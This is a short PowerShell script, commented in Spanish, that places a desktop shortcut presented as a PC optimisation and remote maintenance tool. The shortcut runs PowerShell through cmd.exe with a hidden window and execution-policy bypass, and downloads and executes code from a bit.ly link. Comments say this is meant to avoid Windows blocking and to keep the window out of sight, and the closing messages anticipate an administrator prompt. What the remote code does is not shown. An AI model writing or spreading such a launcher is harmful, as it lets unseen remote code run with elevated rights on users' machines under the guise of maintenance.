# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationFramework

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Optimizar PC - Antony Dapier.lnk" # Nombre del acceso directo

# Si ya existe, lo borramos para evitar conflictos de permisos
if (Test-Path $ShortcutPath) { Remove-Item $ShortcutPath -Force }

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)

# Usamos cmd.exe como puente para evitar el bloqueo de "Acceso Denegado" de Windows
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"

# El comando lanza PowerShell de forma totalmente invisible
$PSCommand = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""iex (irm https://bit.ly/mandia-windows)"""
$Shortcut.Arguments = "/c start /min """" $PSCommand"

$Shortcut.IconLocation = "powershell.exe,0" # Usamos el icono oficial de PowerShell
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.WindowStyle = 7 # Minimizado para que no se vea el flash negro de CMD
$Shortcut.Save()

[System.Windows.MessageBox]::Show("¡Configuración Exitosa!`n`nSe ha creado el acceso directo en tu escritorio. Al abrirlo, Windows te pedirá permiso de administrador para iniciar la optimización.", "Antony Dapier", "OK", "Information")

[System.Windows.MessageBox]::Show("¡Instalación completada!`n`nSe ha creado el acceso directo 'Optimizar PC - Antony Dapier' en tu escritorio. Ya puedes cerrar esta ventana y usar la herramienta.", "Antony Dapier - Mantenimiento", "OK", "Information")
